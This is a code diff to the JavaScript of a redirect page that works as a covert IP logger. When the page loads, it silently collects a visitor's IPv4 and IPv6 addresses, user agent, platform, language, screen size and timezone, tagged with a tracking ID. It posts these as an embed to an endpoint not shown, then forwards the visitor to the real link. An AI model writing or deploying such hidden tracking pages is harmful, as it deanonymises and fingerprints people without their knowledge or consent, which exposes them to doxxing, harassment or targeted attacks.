@@ -2,9 +2,15 @@
 (async () => {
   const params = new URLSearchParams(location.search);
   const redirectUrl = params.get("link");
-  const uid = params.get("id") || "N/A";
+  const uid = params.get("id");
 
-  const ip = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => ({}));
+  if (!redirectUrl || !uid) return;
+
+  const [ipv4, ipv6] = await Promise.all([
+    fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip).catch(() => "N/A"),
+    fetch("https://api64.ipify.org?format=json").then(r => r.json()).then(d => d.ip).catch(() => "N/A"),
+  ]);
+
   const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
   const now = new Date().toISOString();
 
@@ -13,17 +19,13 @@
     color: 0xff0000,
     fields: [
       { name: "ID", value: uid, inline: false },
-      { name: "IP", value: ip.ip || "N/A", inline: true },
-      { name: "ASN", value: ip.asn || "N/A", inline: true },
-      { name: "Org", value: ip.org || "N/A", inline: true },
-      { name: "City", value: ip.city || "N/A", inline: true },
-      { name: "Region", value: ip.region || "N/A", inline: true },
-      { name: "Country", value: ip.country_name || "N/A", inline: true },
-      { name: "Timezone", value: timezone, inline: true },
+      { name: "IPv4", value: ipv4, inline: true },
+      { name: "IPv6", value: ipv6, inline: true },
       { name: "Language", value: navigator.language || "N/A", inline: true },
       { name: "Platform", value: navigator.platform || "N/A", inline: true },
       { name: "User-Agent", value: navigator.userAgent.slice(0, 1024), inline: false },
       { name: "Screen", value: `${screen.width}x${screen.height} @ ${screen.colorDepth}bit`, inline: true },
+      { name: "Timezone", value: timezone, inline: true },
       { name: "Timestamp", value: now, inline: false },
     ],
   };
@@ -34,6 +36,6 @@
     body: JSON.stringify({ embeds: [info] }),
   });
 
-  if (redirectUrl) location.href = redirectUrl;
+  location.href = redirectUrl;
 })();
 </script>
